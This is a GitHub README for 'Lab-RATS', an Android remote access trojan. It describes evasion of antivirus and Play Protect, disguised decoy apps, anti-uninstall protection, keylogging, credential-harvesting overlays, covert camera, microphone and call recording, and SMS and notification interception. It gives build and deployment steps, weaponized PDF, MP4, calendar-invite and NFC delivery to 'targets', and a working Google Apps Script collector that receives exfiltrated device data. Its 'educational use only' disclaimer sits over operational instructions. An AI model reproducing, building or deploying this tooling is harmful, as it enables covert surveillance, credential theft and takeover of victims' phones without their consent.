<p align="center">
<img width="1449" height="504" alt="Screenshot 2026-10-05 at 3 14 37 AM" src="https://github.com/user-attachments/assets/4a758ae8-10a4-4bbf-8485-9d894fb925a5" />


<p align="center">
  <img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
  <img src="https://img.shields.io/badge/Android-SDK_36-green?style=for-the-badge&logo=android&logoColor=white">
  <img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=openaccess&logoColor=white">
  <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
  <br>
  <img src="https://img.shields.io/badge/Network-Direct_IPv6-informational?style=for-the-badge&logo=gitconnected&logoColor=white">
  <img src="https://img.shields.io/badge/Mode-Stealth_FUD-black?style=for-the-badge&logo=ghostfolio&logoColor=white">
  <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
</p>

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=40&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=LAB-RATS" alt="Typing Banner"
 />
</p>

> Lightweight Android-Based Remote Administration Tool for Security: *(L.A.B. - R.A.T.S)*

**Developed from the ground up by KAN3C0, Lab-RATS is an open-source, lightweight Android Remote Administration framework** packed with powerful **monitoring** and **interaction capabilities**. The 
system automates the generation of custom, signed `.apk` files for **deployment onto any Android device**, providing full device telemetry via a **sleek, web-based C2 dashboard**. Built to adapt to **strict modern mobile environments**, it delivers a **robust feature suite** that **operates reliably** across both **legacy** and the **newest Android releases**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Direct+IPv6+Access" 
alt="Typing Banner"
 />
</p>


**Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely eliminating the need for **router manipulation, port 
forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
<details>
  <summary>📸 Click to View IPv6 Exploit Vector</summary>
  <br><p align="center">
  <img src="https://github.com/user-attachments/assets/7097e0e0-1190-4774-b758-ca58b5e8760f" alt="Full Web Page Screenshot" width="70%">
</details>

> [!NOTE]
> **Lab-RATS now supports IPv4 connections** by **hosting on   Render.com** *(Free Tier Supported)*. See **"Command & Control" Option 2** below for **setup instructions**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Core+Features+and+Security" alt="Typing Banner"
 />
</p>

### 🔐 Remote C2 Security & Secure Handshake:
- The **web dashboard** is **protected by a secure login wall** (**Default Password: admin1337**). The password can be **changed directly from the Terminal home page** for 
**enhanced security**.
- Implemented a **masked credential handshake**. Passwords are **reversed and Base64 encoded** (`0x_` prefixed) on the client-side before transmission, rendering them **invisible to browser Network/Payload inspectors**.

### 📦 Automated APK Generation, Identity Control & Density Scaling:
- **Instantly build** `signed.apk` for **production** and **testing**.
- **Fully** customize **App Name**, **Package ID**, and **Minimum SDK**.
- **Resize logos automatically** for **all Android screen densities**.

### 📱 PC/Mobile Responsive:
- The **remote web interface** is 
**fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs**, and **scalable UI elements** for monitoring **from any device**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Covert+Operations+and+Stealth+Management" alt="Typing Banner"
 />
</p>

### 💉 APK Payload Delivery Vectors:
- The **Weaponization Engine** has been **overhauled to support multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)*, **ensuring reliable access** across **all modern mobile environments**.

### 🛡️ Evasion Engine:
-  **Undetectable by Samsung Knox**, **McAfee** and **Google Play Protect**.
-  **Deep Stealth HTML Shield**: The C2 interface utilizes **Shadow DOM Cloaking** and **Base64 Payload Wrapping**. Browser "Elements" inspection is **zeroed-out**, and the tactical structure is **ghosted from 
analysts**.
-  **Web Hardening**: Assets *(JS/CSS)* are **minified and obfuscated**; featuring **anti-debugging loops** and **interaction locks** *(Right-Click, F12)* to **prevent unauthorized analysis**.
- **Dynamic Code Obfuscation**: Build-time **randomization** of **logic flow** and **class names via ProGuard/R8 integration**.
- **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.

### 🎭 Stealth App Decoys:
**Remotely swap the entire Lab-RATS app identity and icon instantly** using **the 
"Masquerade Library"** of **convincing, fully functional Clones**:
- 👀 **System Update** *(Default)*: **Used for initial install** it **simulates a system update** and **prompts for permissions during the process**, achieving **highly successful installs**.
- 🧮 **Calculator**: Performs **actual math** with a **tactical logic engine**.
- 🌦️ **Weather App**: Displays **real-time localized forecasts** via **Open-Meteo API**.
- 🛡️ **Play Protect**: Simulates **a legitimate security scan** to **build target trust**.
- 🐭 **Lab-Rats & System Stability Services**: **Completely unmasked** and **directly opens** the C2 server interface on device.

### ☎️ Emergency Recovery & Self Healing:
- **Dialer Unlock**: Type `*#1337#` on the **phone's keypad** to **unmask the Lab-RATS server interface back into view**.
- **Hidden Backdoor**: If the **device is in stealth mode**, **rapidly tap the middle of the decoy screen 10 times** to **unlock the C2 server interface**. *(Reverts to stealth mode again once app is closed)*
- **Automatically detects** and **repairs damaged service bindings** or **revoked permissions in the background**.
- **Anti-Removal**: **On by default** in the **Ghost Tab**, it **prevents the user from 
uninstalling** or **force-stopping the app** via Settings.

### 🔄 Remote Server Restart:
- **Web UI**: **One-click "RESTART_SERVER" button** on the **Terminal tab** to **refresh background services**.
- **SMS Backdoor**: Send an **SMS/Text containing `!RESTART_C2`** to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.

### 👻 Task-List Ghosting & Dynamic OTA Camouflage:
- The app is **hard-coded** to be **invisible in the Android "Recent Apps" list**.
- Generates **random version 
names and codes** that **mimic legitimate system OTA updates**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Remote+Capabilities" alt="Typing Banner"
 />
</p>

### 👻 Ghost Operations:
- **Ghost Control/Live Feed**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**.
- **Blackout Mode**: A 
**high-stealth mode** designed to **physically mask the targets device display** while maintaining a **NON-masked live remote feed**. *(Pair with Ghost Control for maximum stealth)*
- **Ghost_Toast**: Remotely deploy **tactical, persistent pop-up overlays** with **fully customizable text** *(color, size, and screen positioning)*. Features **multiple animation styles** *(pop, static, and side-scroll)* alongside a **high-intensity "Burnt_Toast" mode** that **floods the screen with randomized pop-ups** to overwhelm the device.
- **Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and 
**render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
- **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.

### 🧪 Exploit Factory:
- **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
- **QR Visual Vector**: Dedicated **high-density QR code generator** for independent URL delivery.
- **Smishing Library**: Pre-configured **tactical phishing templates** with **automated C2 
link injection**.
- **Shadow Overlay**: Remotely **inject functional, pixel-perfect credential-harvesting overlays** to the device.

### 💀 Anti-Removal Shield *(Optimized)*:
- **High-speed, event-driven protection** that **blocks attempts** to **Uninstall** or **Force Stop** the **app**.
- **Suicide Protocol (Self-Destruct)**: **Remote-triggered persistent loop** that **wipes all local configuration** and initiates a **hard uninstallation of the C2 core**.

### 🛰️ Live GPS Tracking & Intel Stream *(Sniffer)*:
- **One-click uplink** to open the **devices exact real-time location** using **Google Maps**.
- **Intercept every app notification** *(WhatsApp, Telegram, RCS, System...etc)* in a **live feed**.

### 📸 Tactical Surveillance Hub *(Ultra-Stability)*:
- **Covert Recording**: **Stealthily record video without any user-facing activity**.
- **Snap Photos**: **Covert image capture** integrated into the **live stream**.
- **Nightmode V2**: Aggressive **electronic brightening** for **low-light environments**. Now features **Hardware Breathe Sync** and **AE Bypass** for **zero-freeze operation** on 
**modern high-latency sensors**.

### 🎙️ Acoustics & Interception:
- **Timed or Live microphone recording** and **automated call recording** for **both incoming and outgoing calls**.

### 📂 Advanced Data Uplink:
- **Integrated File Manager**: **Navigate, download**, and **manage files**. Features an **instant Search Bar** and **Category Filters**.
- **Info Gathering**: Access **Call Logs**, **Contacts**, **Hardware Analytics**, and **Installed Apps** remotely.
- **📝 Direct File Editor**: **Live-edit text, JSON**, and **log files** directly **on the device**.

### 🖥️ Enhanced Remote Shell:
The **Terminal Tabs Built-in Shell has been overhauled** for **professional workflows**:
- **Command History**: Navigate **previous commands instantly** using **Up/Down arrows**.
- **Modernized Interface**: Updated to `root@Android` prompt with **an updated `help` menu**.
- **Hardened I/O**: **Multi-stage retry logic** and **unique execution tracking** for **zero-latency command output**.

### 📊 Telemetry & Reporting:
- **C2 Auto-Reporting**: **Discrete reporting** of **Date & Time, Device ID, Connection Type *(WiFi/Cellular)*, IP Address & Port, C2 Dashboard Link, Battery %, Stealth & Charge Status, and Device Storage** to a **centralized Google Sheet or Render C2**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Native+Integration" alt="Typing Banner"
 />
</p>

### 🛠️ Termux Bridge Integration:
**Lab-RATS** now features a **high-performance bridge to the Termux environment**. If 
**Termux is installed on the target device**, the remote terminal can **instantly elevate its capabilities**:
- **Auto-Routing**: Common commands like `pkg`, `apt`, `pip`, and `python` are **routed through the bridge**.
- **Unrestricted Tools**: **Install** and **run Python scripts, Nmap scans, or Metasploit** from the **C2 web terminal**.
- **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
> [!NOTE]
> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**" *(Most Common)*.
<br>**Solution**: **On the Target 
Device** open **Termux and run**:
```zsh
echo "allow-external-apps = true" >> ~/.termux/termux.properties
termux-reload-settings
```
---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Command+and+Control+(C2)+Options" alt="Typing Banner"
 />
</p>

**Lab-RATS** supports **TWO 
primary methods** to **track your device fleet**, and **remotely connect/receive data**

### ☝🏻 Option 1: Google Sheet *(Updated)*
**Best for basic IP tracking** and **logging**. **No server maintenance required**.

1.  **Create** a new <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**

```javascript
function doGet(e) { return handleRequest(e); }
function doPost(e) { return 
handleRequest(e); }

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
    
    // Auto-initialize headers if new sheet
    if (sheet.getLastRow() == 0) {
      sheet.appendRow([
        "Timestamp", 
        "Model #", 
        "Connection Type", 
        "IP Address", 
        "Port", 
        "Active C2 Link", 
        "Battery", 
        "Stealth Status", 
        "Power", 
        "Free Storage"
      ]);
    }
    
    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
    
    var row = [
      new Date(),
      data.device || data.model || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "9191",
      data.link || "Handshake_Pending",
      data.battery || "0%",
      (data.stealth === true || 
data.stealth === "true") ? "ACTIVE" : "OFF",
      data.charging || "Discharging",
      data.storage || "Unknown"
    ];
    
    sheet.appendRow(row);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(E-Mail)* → **Who has Access: Anyone**.

> [!IMPORTANT]
> 4.  **Copy the Webhook URL provided** and **prepare to paste it into the APK-builder tool** when **prompted**. *(Get Started Section Below)*

---

### ✌🏻 NEW! Option 2: Tactical Node.js Backend *(Upgraded v1.6)*
**Best for professional fleet management** and **Automatic File Exfiltration**.

**Quick Deployment on** <a href="https://render.com" target="_blank">Render.com</a> 

**1. Create a new Web Service on Render** and **connect your 
Lab-RATS repository**.
<br>**2. Set the Root Directory** to c2-server.
<br>**3. Set the Build Command** to `npm install`.
<br>**4. Set the Start Command** to `npm start`.
<br>**5. Deploy!** Once live, **copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, then **Enter that URL into the APK-Builder when prompted** for the **C2 Webhook URL**.
<details>
  <summary>📸 Click to View Render C2 Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/1d97c7de-2c64-45ff-8653-9c3c0ac2c772" alt="Full Web Page Screenshot" width="80%">
</details>
  
**Advantages of Option 2**:
- 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, **enabling seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks**.
- 📂 **Exfiltration Vault**: **Audio/Video recordings** are automatically uploaded and **stored on your server**.
- 📡 **Live Fleet List**: A **professional dashboard** to **manage all devices in one place**, with **editable device name** for **easy device recognition** and **NEW "Quick Action" pull-down menu** to deploy features **without directly 
connecting**.
- 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your **P2P links are always up-to-date**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=System+Requirements+and+Prerequisites" alt="Typing Banner"
 />
</p>

To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your 
environment meets the following requirements**:

### 1. Workstation & Build Requirements: *(For Building APKs)*
* **Java Development Kit (JDK)**: **JDK 17 or JDK 21** *(JDK 21 recommended)*.
  * Ensure `JAVA_HOME` is set in your environment paths.
* **Android SDK**: **Android SDK 34** *(API Level 34)* or higher.
  * **Build-Tools**: Version `34.0.0` or higher *(includes `aapt2`, `zipalign`, and `apksigner`)*.
* **Python 3.x**: Required for **Option 7: Smali Surgery & APK Binder** *(`binder.py`)*.
* **Gradle**: Handled automatically via the included `./gradlew` *(Gradle 8.10+)*.

### 2. C2 Server Hosting Requirements: *(For Option 2: Render.com/Railway)*
* **Node.js**: **v18.0.0** or higher.
* **npm**: **v9.0.0** or higher.
* **Render / Linux Hosting**: 512 MB RAM minimum *(Render Free Tier supported)*.

### 3. Android Device Compatibility:
* **Minimum OS**: **Android 5.0** *(Lollipop/API 21)* or **higher**.
* **Target OS**: **Android 14 - 16** *(API 34 - 36)* **fully supported**.
* **Supported Devices**: **Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG**, and **generic Android devices/
emulators**.

### 4. Operating System Compatibility:
* 🐧 **Linux**: **Kali Linux, Ubuntu, Debian, Arch** *(Full support for build scripts & C2 server)*.
* 🍎 **macOS**: **macOS Monterey / Ventura / Sonoma / Sequoia** *(Intel & Apple Silicon M1/M2/M3/M4)*.
* 🪟 **Windows**: **Windows 10 / 11 via PowerShell, Command Prompt**, or **WSL2**.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Get+Started" alt="Typing Banner"
 />
</p>

### 1. Building the APK (on PC)
1.  **Download the Repository**: `git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git`
2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
3.  **Execute** the **Builder**:
    *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
    *   **Windows**: `build.bat`
4.  **Select a Build Strategy**:
    *   **Option 1 (Manual)**: For **basic configuration** of **App Name, ID**, and **Logo** before **building**.
    *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.
5.  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting**.
6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from the `Lab-RATS-v1.6/apk-builder/output/` **directory**.

### 2. Deploying & Installing onto Android Devices
**Deployment** is **a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.

#### A. Strategic Weaponization: (The Wrapper)
**Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder`tool to **wrap your link inside a high-compatibility carrier file**:
*   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download, bypassing standard PDF security filters**.
*   **🎬 Zero-Click MP4**: **Send as a video file**. It **exploits** mobile **Media Heap Overflows** during **gallery indexing or thumbnail generation** to **force-register the C2 link in the background**.
*   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the **target's Calendar with automated reminders** and a **weaponized "Security Review" link**.
*   **🔳 QR Code / 📡 NFC**: **Best for physical placement** or **"Tap-to-Infect" proximity delivery**. Generates a **high-density QR** or **NDEF record** pointing to the **hardened delivery URL**.
*   **and Many More**: The **Wizard** also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document macros**.

#### B. Hosting Strategies:
*   **Anonymous Cloud**: **Option 6** uses **Catbox.moe by default**. 
It is **anonymous, fast**, and **generates a direct link**. Now includes **fallback upload to Litterbox and tmpfiles** if needed.
*   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from **another infected device** using the `/download/` endpoint.

#### C. Installation & Initialization:
Once the **Target device** downloads the **APK**:
1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
2.  **Permissions (CRITICAL)**: **Open the app ONCE**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
    -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
3.  **Self-Vanishing**: A **few seconds after launch**, the app will **automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
4.  **Uplink Confirmation**: Check your **Google Sheet or Render C2. Within 5 seconds of initialization**, the **Device ID, Connection Type, IP Address & Port, C2 Dashboard Link, Battery %, Stealth & Charging Status and Device Storage will appear in the log**.

<details>
  <summary>📸 Click to View Google Sheet Reporting</summary>
  <br><p align="center">
  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"
 />
</p>

**If** you find **Lab-RATS awesome** and **useful for your security research**, **please Star ⭐ the project**—it **drives further development!!**

### Contributions:
**Bug Reports, Add New Feature** and **Pull Requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**.)*

---

### Donate:
<img src="https://img.shields.io
/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black">

**https://buymeacoffee.com/k4n3co**

<img src="https://img.shields.io/badge/Donate-Bitcoin-F7931A?style=for-the-badge&logo=bitcoin&logoColor=white">

```
bc1q8d66m0qthnh6nw9hc5wl09m7pfydk46q5w8rxx
```

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner"
 />
</p>

### APK-Builder Example *(Mac OS)*:

https://github.com/user-attachments/assets/9cb336c8-748d-48ce-9c8f-f0065654be24

---

### Lab-RATS Initial Install Sequence:

https://github.com/user-attachments/assets/dbeffae9-8470-4592-a314-1fabc5a9362d

---

### C2 Dashboard (PC Interface) - Remote Shell & Decoys:

https://github.com/user-attachments/assets/8cb56f9d-3f40-4a6f-bddc-79bbbf9c273e

---

### C2 Dashboard - Ghost Ops & Locate:

https://github.com/user-attachments/assets/2ac424d5-9df6-4732-aa4e-6b486a9809a4

---

### C2 Dashboard - Covert Camera Hub:

https://github.com/user-attachments/assets/50296f14-6875-403a-8484-299a9628746d

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Screenshots" alt="Typing Banner"
 />
</p>

### 00. Lab-RATS.apk Installed on Android Device:

<details>
  <summary>📸 Click to View App Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/63bc22d1-70cb-47c2-b4ed-f99dc0464ab0" alt="Full Web Page Screenshot" width="30%">
</details>

---

### 01. Home/Terminal Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/920be29b-88bd-4516-82ff-1deb28cce098" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 02. Ghost Operations Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/25021056-538d-4392-bbf1-e66a2c5873af" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 03. Optics/Live Camera Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/020eff59-9444-4dcd-b987-6c0fbcb6249e" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 04. Locate/Live GPS Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/cae2c596-8551-4dbf-80a3-6a9b4cfec58d" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 05. Exploit_Factory Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/9adc2ea3-9705-4f61-9d47-329f4d17b373" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 06. Device Data/Storage Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/55726a19-c071-405c-afef-ab50f119f3e0" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 07. Intel/App Notifications Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/35c0ff19-fec5-4734-a103-99f260ea7419" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 08. SMS/Text Message Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/bafdc486-fc2b-4399-99c9-2e6e444d8a18" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 09. MMS/Multimedia Message Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/2559606d-6025-416c-99b1-8a78e046d31b" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 10. Acoustics/Audio Tab:

<details>
  <summary>📸 Click to View Web 
Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/8b1efce6-1d3b-490c-8d73-9dbde39c2a53" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 11. Comms/Call_Logs Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/53d82189-6cb9-4489-835b-b929624181de" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 12. Contacts Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/9c7336a1-9770-4881-bfcc-3de331812789" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 13. Hardware/Device Info Tab:

<details>
  <summary>📸 Click to View Web Page Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/d918e6bf-7b92-42ad-bf17-c38ef1c32615" alt="Full Web Page Screenshot" width="80%">
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner"
 />
</p>

This tool is for **educational and authorized security testing purposes ONLY!**. The **developers & contributors** assume **NO responsibility** for **ANY** **misuse, damage to devices or relationships** caused by this software. **Please use it responsibly**. **Thank you!**

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=32&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=License" alt="Typing Banner"
 />
</p>

**Lab-RATS-v1.6** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).

---

<p align="center">
<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind-cyan?style=for-the-badge&logo=maserati&logoColor=white">
<br>
<p align="center">
<img src="https://img.shields.io/badge/Developed By-KAN3C0 ©2026-darkred?style=for-the-badge&logo=magisk&logoColor=white">
